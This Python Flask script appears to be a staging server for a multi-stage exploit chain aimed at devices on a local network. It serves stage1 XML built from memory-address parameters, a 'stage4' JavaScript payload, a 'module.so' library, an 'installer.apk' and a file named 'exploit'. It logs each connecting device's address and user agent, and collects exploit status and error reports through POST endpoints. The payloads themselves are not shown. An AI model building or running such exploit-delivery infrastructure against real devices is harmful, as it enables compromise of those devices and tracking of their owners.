#!/usr/bin/python

import sys
import fcntl
import datetime

# Dynamic pages
from stage1_xml import stage1_xml
from stage4_js import stage4_js

from flask import Flask, make_response, request, abort
app = Flask(__name__)

# [ Debug server configuration ] --------------------------------------------- #

# The directory prefix (needs to start with / or be blank)
PREFIX = ""

# [ Utility functions ] ------------------------------------------------------ #

def readfile(name):
    with open(name, "rb") as fp:
        content = fp.read()
    return content

def nocache(s):
    """
    Builds a response that tells the client never to cache the page with
    the specified string output.
    """

    resp = make_response(s)
    resp.headers['Cache-control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'    

    return resp

# [ Improvised crappy security ] --------------------------------------------- #

@app.before_request
def limit_remote_addr():
    addr = request.remote_addr
    
    # Only allow connections from the RSSM/RTNU network and myself
    # This is not secure, however it will be enough against random portscans
    # on the wired network.
    if (not addr.startswith("192.168.")) and (addr != "127.0.0.1"):
        abort(403)
        
    
# [ Home page ] -------------------------------------------------------------- #
    
@app.route('/')
def hello():
    return "Hello from flask server!"

# [ Static files ] ----------------------------------------------------------- #

# Static files are explicitly defined here so it will be easier to
# understand which files will need to be deployed statically at
# prime time.

@app.route(PREFIX + '/go')
@app.route(PREFIX + '/go.htm')
@app.route(PREFIX + '/go.html')
def go_html():
    return nocache(readfile("go.html"))

@app.route(PREFIX + '/scriptid.js')
@app.route(PREFIX + '/script.js')
def script_js():
    ua = request.headers.get('User-Agent')
    do_log("--- Device connected: {}".format(request.remote_addr))
    do_log("--- {}".format(ua))
    return nocache(readfile("script.js"))
    
@app.route(PREFIX + '/scriptidm.js')
@app.route(PREFIX + '/scriptidp.js')
def script_wrong():
    return nocache(readfile("redir.js"))

@app.route(PREFIX + '/stylesheet.xsl')
def stylesheet_xsl():
    return nocache(readfile("stylesheet.xsl"))

@app.route(PREFIX + '/module.so')
def module_so():
    return nocache(readfile("module.so"))

# [ Dynamic pages ] ---------------------------------------------------------- #

# Request format: /data.xml?id=<base>
@app.route(PREFIX + '/data.xml')
def data_xml():
    base = request.args.get('id')
    nextaddr = request.args.get('contentId')

    try:
        base = int(base) 
    except ValueError:
        base = None

    if nextaddr is not None:
        try:
            nextaddr = int(nextaddr) 
        except ValueError:
            nextaddr = None

    if base is not None:
        resp = nocache(stage1_xml(base, nextaddr=nextaddr))
    else:
        abort(404)
        # # Default response
        # resp = nocache(stage1_xml())
        
    resp.headers["Content-type"] = "application/xml"
    return resp

@app.route(PREFIX + '/stage4.js')
def stage4_js_serve():
    magic = request.args.get('trk')
    resp = nocache(stage4_js(magic))

    resp.headers["Content-type"] = "text/javascript"
    return resp

@app.route(PREFIX + '/installer.apk')
def installer_apk():
    return nocache(readfile("installer.apk"))

@app.route(PREFIX + '/exploit')
def exploit_install():
    return nocache(readfile("exploit"))

# [ Very basic server debug logger ] ----------------------------------------- #

def do_log(s):
    with open("tacgnol.log", "a") as fp:
        timestamp = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        fcntl.flock(fp, fcntl.LOCK_EX)
        fp.write("[{}] {}\n".format(timestamp, s))
        fcntl.flock(fp, fcntl.LOCK_UN)


@app.route(PREFIX + '/log/info', methods=['POST'])
def log_info():
    info = request.form["logdata"].rstrip()
    do_log(info)
    return "", 200

@app.route(PREFIX + '/log/error', methods=['POST'])
def log_error():
    info = request.form["logdata"].rstrip()
    do_log("EXPLOIT ERROR: {}".format(info))
    return "", 200

# [ Module init ] ------------------------------------------------------------ #

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8080)

